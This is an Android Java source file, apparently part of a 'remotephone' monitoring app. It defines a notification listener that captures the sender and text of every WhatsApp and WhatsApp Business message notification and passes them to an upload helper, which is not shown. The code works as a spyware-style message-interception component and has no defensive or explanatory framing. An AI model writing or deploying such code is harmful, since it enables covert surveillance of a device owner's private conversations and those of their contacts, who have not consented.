package com.exemplo.remotephone;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;

public class WhatsAppListener extends NotificationListenerService {
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (!"com.whatsapp".equals(pkg) && !"com.whatsapp.w4b".equals(pkg)) return;
        Bundle extras = sbn.getNotification().extras;
        CharSequence title = extras.getCharSequence("android.title");
        CharSequence text  = extras.getCharSequence("android.text");
        long ts = sbn.getPostTime();
        if (title!=null && text!=null) {
            UploadHelper.uploadWhatsApp(
                getApplicationContext(),
                title.toString(),
                text.toString(),
                ts
            );
        }
    }
}
